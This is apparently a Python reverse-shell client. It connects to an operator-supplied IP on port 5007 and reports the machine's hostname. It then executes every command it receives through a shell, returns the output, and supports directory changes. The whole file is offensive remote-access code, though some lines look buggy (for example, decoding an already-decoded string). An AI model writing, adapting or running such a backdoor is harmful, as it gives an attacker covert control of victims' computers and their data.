import socket
import subprocess
import sys
import os

host = "Your IP Address"
port = 5007
size = 2048 #buffer size

try:
	s = socket.socket()
	s.connect((host,port))
	print ("Connected to ip xxx.xxx.xx.xx")
except:
	print ("Error connecting me!!")
	sys.exit()

os.system('clear')

hostname = subprocess.check_output("hostname")
s.send(hostname.encode())

while True:
	command = s.recv(size).decode()
	if command.lower() == "exit":
		break
	if command.split(" ")[0] == "cd":
		os.chdir(command.split(" ")[1])
		s.send("New Directory: {}".format(os.getcwd()).encode())
	cmd = subprocess.Popen(command[:].decode(), shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	output = str((cmd.stdout.read() + cmd.stderr.read()))
	s.send(output.encode())
	if not cmd.stderr.read():
		s.send(str(cmd.stderr.read()).encode())

s.close()
